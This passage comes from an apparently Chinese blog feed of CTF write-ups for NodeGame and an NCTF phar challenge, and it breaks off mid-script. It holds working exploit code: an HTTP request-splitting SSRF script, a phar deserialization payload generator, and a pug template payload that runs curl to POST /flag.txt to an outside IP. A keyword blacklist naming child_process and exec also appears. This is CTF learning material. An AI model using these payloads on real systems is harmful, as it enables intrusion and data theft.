occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å…³äº<code>/core</code>ä¸ç”¨å¤šè¯´ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ï¼Œè€Œå…³äº<code>file_upload</code>åˆ™ç±»ä¼¼ä¸Šé¢é‚£é¢˜çš„<code>/flag</code>ã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾æ–‡ä»¶ä¸Šä¼ çš„æ‰§è¡Œç‚¹åœ¨å“ªã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°é¦–é¡µæ¥å—äº†ä¸€ä¸ªactionå‚æ•°ï¼Œä¼šå°†æˆ‘ä»¬ä¸Šä¼ åˆ°/template/ç›®å½•ä¸‹çš„æ–‡ä»¶pugæ¸²æŸ“ã€‚å¹¶ä¸”è¿”å›å€¼ã€‚è¿™æ ·çš„è¯æˆ‘ä»¬æ€è·¯å¤§è‡´å°±æ¸…æ™°äº†ï¼š<br>è¿˜æ˜¯é€šè¿‡coreè¿›è¡Œssrfå¹¶ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„httpåŒ…è®¿é—®åˆ°/flagã€‚ä¹‹åç›´æ¥é¦–é¡µæ–‡ä»¶åŒ…å«è§¦å‘æ¸²æŸ“ï¼Œå°±å¯ä»¥è®¿é—®åˆ°å†…å®¹ã€‚<br>ç”±äºè¿™é‡Œç›´æ¥æ„é€ å¤´å¤ªéº»çƒ¦ï¼Œæ‰€ä»¥è¦å…ˆæŠ“ä¸ªç°æˆçš„pugæ–‡ä»¶ä¸Šä¼ åŒ…ä¼ªé€ ä¸‹ï¼Œæ³¨æ„åŒ…é‡Œé¢çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line">Content-Length:292</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure><p>ç­‰å‚æ•°ä¸å¯éšä¾¿ä¹±æ”¹<br>è¿™é‡Œå€Ÿèµµå¸ˆå‚…è„šæœ¬å°æ”¹ä¸‹ï¼š<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------191691572411478</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Length: 292</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------191691572411478</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="exp.pug"</span></span><br><span class="line"><span class="string">Content-Type: /../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.get(<span class="string">'http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯å¸¸è§„çš„æŠŠæ„é€ å¥½çš„requestç”¨å­—ç¬¦ç»•è¿‡ã€‚å½“ç„¶æˆ‘ä»¬ä¸Šä¸€é“é¢˜çš„å…«è¿›åˆ¶ç­‰ç­‰å…¶ä»–ç»•è¿‡æˆ‘è§‰å¾—éƒ½å¯ä»¥ï¼Œæ¯•ç«Ÿæ­¤å¤„æ²¡é™åˆ¶urlä¼ å‚ä¸å«å­—æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?action&#x3D;exp</span><br></pre></td></tr></table></figure><p>æˆåŠŸåŒ…å«flag<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å€¼å¾—ä¸€æçš„æ˜¯æˆ‘æƒ³ç”¨curlç­‰ç­‰æ—¶åˆå¤±è´¥äº†ï¼Œæˆ‘æŒ‰å‡ºé¢˜äººç»™çš„æ–¹æ³•æ„é€ åŒ…é‡Œç›´æ¥æ”¾å‘½ä»¤ï¼Œç»“æœå¾ˆæ— è¯­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------12837266501973088788260782942</span><br><span class="line">Content-Length: 6279</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;?action&#x3D;upload</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;byc403.pug&quot;</span><br><span class="line">Content-Type: ..&#x2F;template</span><br><span class="line"></span><br><span class="line">- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http:&#x2F;&#x2F;120.27.246.202:8877 -X POST -d $(cat &#x2F;flag.txt)&#39;)</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942--</span><br></pre></td></tr></table></figure><p><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error"><br>æç¤ºä¸èƒ½ Couldnâ€™t connect to server.<br>ç„¶è€Œå‡ºé¢˜äººçš„expé‡Œå°±æ˜¯ç”¨çš„execSync+curlã€‚æˆ‘ä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µã€‚æ¯•ç«Ÿå…¬ç›Šèµ›ä¸¤é“nodeé¢˜éƒ½å·²ç»è¯å®ä¸èƒ½<code>curl,wget,nc,bash</code>ç­‰ç­‰åå¼¹shellæˆ–è€…è¿å¤–ç½‘çš„æ“ä½œã€‚æ„Ÿè§‰å¾ˆè¿·ã€‚é‚£åªèƒ½æŒ‰èµµå¸ˆå‚…é‚£æ ·includeäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF-phar-matches-everythingå¡«å‘</title>
      <link href="2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/"/>
      <url>2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æ ¡èµ›webæœ€éš¾çš„ä¸€é“é¢˜â€¦â€¦å½“æ—¶æ°´å¹³èœçš„çœ‹éƒ½ä¸æ•¢çœ‹ï¼Œç°åœ¨æŒ‰å¸ˆå‚…è¦æ±‚æ¥åšåšè¿™é“é¢˜ã€‚(zjyå¸ˆå‚…è¯´è¿™é¢˜æŠŠphpç›¸å…³çŸ¥è¯†å‡ ä¹å…¨è€ƒäº†ï¼Œçœ‹æ¥æ˜¯å¾ˆé›†å¤§æˆçš„ä¸€é“é¢˜ç›®ã€‚)</p><p>é¢˜ç›®é¦–å…ˆè¿›å»åæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ä»…é™åˆ¶å›¾ç‰‡çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚å¦ä¸€ä¸ªæ˜¯ç”¨<code>getimagesize()</code>æ­é…çš„è¯»å–å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯çš„åŠŸèƒ½</p><p>é¦–å…ˆæ˜¯æºç æ³„éœ²ã€‚åœ¨catchmachine.phpå­˜åœ¨<code>.swp</code>æ³„éœ²ã€‚ç„¶è€Œbuuojä¸Šé¢˜ç›®å¹¶æ²¡æœ‰æ³„éœ²ï¼Œç›´æ¥çœ‹æºç å¥½äº†</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Mainç±»é‡Œçš„<code>__destruct()</code>å±…ç„¶å­˜åœ¨ååºåˆ—åŒ–ï¼Œå¾ˆæœ‰æ„æ€ã€‚ç„¶åå¦‚æœç»•è¿‡è¿™ä¸ªç‚¹å°†æ‰§è¡Œä¸€æ®µ<code>curl</code>ï¼Œè¿™åˆæ˜¯ssrfçš„ç‚¹äº†ã€‚ä½†æ˜¯æˆ‘ä»¬åˆè¦ç»•è¿‡<code>getimagesize</code>çš„æ£€æŸ¥ï¼Œè¿™å°±å¾—åˆ©ç”¨åˆ°pharååºåˆ—åŒ–äº†ï¼Œå› ä¸ºpharèƒ½ç»•è¿‡ç»å¤§éƒ¨åˆ†æ–‡ä»¶çš„æ£€æŸ¥ã€‚<br>æ—¢ç„¶å¦‚æ­¤å…ˆssrfè¯»æ–‡ä»¶<br>é‚£ä¹ˆæ„é€ exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test=<span class="string">"1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"file:///etc/hosts"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> (urlencode(serialize($a)));<span class="comment">#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹åç¼€ä¸ºgif,jpegï¼Œå¯ä»¥ç»•è¿‡ä¸Šä¼ ã€‚è€Œæ‰“å°å‡ºçš„ç”¨äºè§¦å‘ssrfçš„é­”æœ¯æ–¹æ³•çš„ååºåˆ—åŒ–æ•°æ®åˆ™ä¼ åˆ°urlä¸­ã€‚ä¹‹åå†ç”¨<code>phar://</code>ä¼ªåè®®è§¦å‘ã€‚è¿™æ ·æˆ‘ä»¬å°±ç›´æ¥å†™å‡ºç”¨äºè§¦å‘pharååºåˆ—åŒ–çš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D'</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'phar://uploads/d388a7ce2d.gif'</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯ssrfåˆ©ç”¨äº†ï¼Œæ­¤å¤„ä¾æ—§æ˜¯æ‰“å†…ç½‘ã€‚æ¢æµ‹å®Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">173.0.168.9osrc</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é¡ºç€ä¸»æœºæ¢æµ‹<code>http://173.0.168.10</code>ï¼Œå¯ä»¥å‘ç°æœ‰å›æ˜¾<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å­˜æ´»ä¸»æœº"><br>php-FPMè¦æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œè¦æåˆ°pç‰›çš„æ–‡ç« ï¼š<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>å…·ä½“pç‰›å†™çš„å¾ˆè¯¦ç»†,æˆ‘ä»¬çŸ¥é“çš„ï¼Œå°±æ˜¯å¯ä»¥ç›´æ¥æ‹¿è„šæœ¬åˆ©ç”¨è¿™ç‚¹ï¼Œä½¿ç”¨gopheråè®®ä¼ è¾“tcpæ•°æ®æ”»å‡»å†…ç½‘ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚<br>ä½¿ç”¨å¦‚ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 